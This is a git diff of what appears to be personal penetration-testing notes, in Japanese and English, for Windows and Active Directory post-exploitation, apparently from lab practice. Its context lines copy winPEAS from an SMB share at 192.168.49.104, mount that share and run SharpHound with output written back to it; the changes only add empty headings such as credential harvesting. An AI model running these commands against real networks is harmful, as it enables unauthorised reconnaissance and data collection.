@@ -78,11 +78,6 @@ cp \\192.168.49.104\share\winPEASx64.exe .
 
 ---
 
-### PowerShellログ
-
-
----
-
 ### サービス
 
 
@@ -97,6 +92,12 @@ cp \\192.168.49.104\share\winPEASx64.exe .
 
 
 ---
+---
+
+# Credential harvesting
+
+
+
 ---
 
 # AD
@@ -114,3 +115,13 @@ net use \\192.168.49.104\share /user:username pw
 Import-Module \\192.168.49.104\share\SharpHound.ps1
 Invoke-BloodHound -CollectionMethod All -OutputDirectory \\192.168.49.104\share -ZipFileName 'audit.zip'
 ```
+
+---
+
+# Seatbeld 結果（記録用）
+
+
+---
+
+
+# WinPEAS結果（記録用）
